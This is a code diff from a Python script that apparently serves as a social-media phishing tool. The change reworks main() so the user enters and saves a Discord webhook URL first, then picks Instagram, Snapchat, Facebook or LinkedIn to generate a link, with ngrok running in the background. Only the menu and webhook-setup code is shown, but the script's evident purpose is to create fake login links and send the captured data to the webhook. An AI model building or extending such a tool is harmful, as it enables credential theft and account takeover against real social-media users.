@@ -632,27 +632,34 @@ def setup_webhook():
             return None
 
 def main():
-    while True:
-        print_menu()  # Just show the menu first
+    # Check for webhook.txt first
+    webhook = load_webhook()
+    if not webhook:
+        print("\n" + "=" * 60)
+        print(colored("Discord Webhook Setup Required", 'yellow'))
+        print("=" * 60)
+        print("\n" + colored("Instructions:", 'cyan'))
+        print("1. Open Discord")
+        print("2. Go to Server Settings")
+        print("3. Select Integrations")
+        print("4. Create Webhook")
+        print("5. Copy Webhook URL")
+        print("\n" + colored("Format:", 'cyan') + " https://discord.com/api/webhooks/...")
         
-        # Ask for webhook URL before platform selection
-        webhook_url = setup_webhook()
-        if not webhook_url:
+        webhook = input("\nEnter your Discord webhook URL: ").strip()
+        if not webhook:
             print(colored("\nExiting... No webhook URL provided", 'red'))
             return
-            
-        # Now get the platform choice
-        choice = input("\nEnter your choice: ").strip()
+        save_webhook(webhook)
+        print(colored("\n✓ Webhook URL saved successfully", 'green'))
+        input("\nPress Enter to continue...")
+        os.system('cls' if os.name == 'nt' else 'clear')
+    
+    while True:
+        # Show menu and get choice
+        choice = print_menu()
         
-        if choice == '1':
-            generate_link('instagram')
-        elif choice == '2':
-            generate_link('snapchat')
-        elif choice == '3':
-            generate_link('facebook')
-        elif choice == '4':
-            generate_link('linkedin')
-        elif choice == '5':
+        if choice == '5':
             print(colored("\nExiting...", 'yellow'))
             # Kill any running ngrok process
             if os.name == 'nt':
@@ -660,6 +667,17 @@ def main():
             else:
                 os.system('pkill ngrok')
             break
+            
+        if choice in ['1', '2', '3', '4']:
+            # Process the choice
+            if choice == '1':
+                generate_link('instagram')
+            elif choice == '2':
+                generate_link('snapchat')
+            elif choice == '3':
+                generate_link('facebook')
+            elif choice == '4':
+                generate_link('linkedin')
         else:
             print(colored("\n× Invalid choice!", 'red'))
             print(colored("Press Enter to continue...", 'yellow'))
